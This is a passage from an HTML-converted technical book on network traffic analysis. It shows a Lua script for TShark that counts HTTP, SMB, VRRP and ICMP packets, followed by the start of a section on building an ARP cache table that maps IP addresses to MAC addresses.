New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >function listener.packet(pinfo, tvb)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- local variable for out ip.proto field local protocolnumber = proto()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:43.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- check to see if the packet has an ICMP field, if so increment</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >the ICMP counter</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(icmpfield()) then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section341" ><p class=MsoNormal  style="margin-top:3.7500pt;margin-right:229.0000pt;margin-left:51.1500pt;text-indent:7.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >icmpcounter =</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >icmpcounter+1 end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:43.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- check to see if the packet has a VRRP field, if</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >so increment</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >the VRRP counter</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:229.0000pt;margin-left:58.3500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if(vrrpfield()) then vrrpcounter = vrrpcounter+1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- see if the IP protocol is 6, aka TCP, if so then check</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >for</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >both HTTP and SMB</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:17.2500pt;margin-left:58.3500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if<a name="_bookmark636" ></a>(protocolnumber and protocolnumber.value == 6) then local http = httpfield()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:266.2000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local smb = smbfield() if http then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:87.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >httpcounter = httpcounter+1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:58.3500pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >if smb then</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:87.1000pt;text-indent:0.0000pt;text-align:left;line-height:13.4500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >smbcounter = smbcounter+1</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:403.0500pt;margin-left:51.1500pt;text-indent:7.1500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:29.5500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create the draw function which will display our counters function listener.draw()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:51.1500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >print(string.format("HTTP: %i", httpcounter)) print(string.format("SMB: %i", smbcounter)) print(string.format("VRRP: %i", vrrpcounter)) print(string.format("ICMP: %i", icmpcounter))</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:431.8000pt;margin-left:8.0000pt;text-indent:21.5500pt;text-align:left;line-height:198%;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" >end end</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;line-height:198%;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:178.7000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- run our listener function HelloWorldListener()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The output should look like the following snippet:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.2500pt;margin-right:52.5000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~$ tshark -2 -q -X lua_script:countpackets.lua Capturing on 'eth0'</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:417.3500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >82 ^C HTTP: 18 SMB: 0 VRRP: 0 ICMP: 3</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section342" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s count some more packets, but this time we&#8217;ll mix it up a bit and do something a little more interesting than just strictly counting the number of packets.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h2 style="margin-top:15.0500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >ARP Cache Script</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:10.2500pt;" ><span><a href="#_bookmark198" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Chapter 3</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >briefly discussed how the ARP protocol resolves IP addresses to MAC addresses. Internally, your computer uses what is referred to as an </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >ARP cache </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to store these records of IP addresses to MAC addresses. We are going to walk through how to replicate that with TShark and some Lua scripting. First, we decide on a filter and the fields we want to access. Because we are looking for IP traffic, we know we should probably filter on those. We are also interested in ARP traffic, as it can allow us to map MAC addesses to IP addresses. In particular, we want the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp.src.proto_ipv4 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field, which is the ARP sender&#8217;s IP address. <a name="_bookmark637" ></a>We also need the MAC address source that can be found in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >eth.src</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field and the IP source address for packets, which is available in the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip.src</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field. To start, we create a filter for IP or ARP traffic to access the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp.src.proto_ipv4</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >eth.src</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, and the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >ip.src</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-6.1500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >fields:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.2500pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--filter on either arp or IP packets (so all packets with a MAC to IP mapping)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local new_filter = "arp || ip"</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:28.7500pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- we want the src of the arp packet (remember arp doesn't have</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >an IP header)</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:114.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local arp_ip = Field.new("arp.src.proto_ipv4") local eth_src = Field.new("eth.src")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local ip_src = Field.new("ip.src")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >To keep track of the MAC address to IP mapping, we use a table and set the keys to the IP address and the values to the MAC addresses. To start, though, we are just going to create an empty table called </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp_cache</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.8500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >-- create an empty table that will become our ip to mac address mapping</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:36.7500pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local arp_cache = {}</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We create a listener passing in our filter and then define the packet</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section343" ><p class=MsoBodyText  style="margin-top:3.8000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >function that is called for every packet. We then check to see if the packet has the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp.src.proto_ipv4 </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field. If it does, we will use that field as the source IP address and map it to the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >eth.src </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >of the ARP packet. If the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >arp.src.proto_ipv4</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.8000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >field isn&#8217;t available, then we use 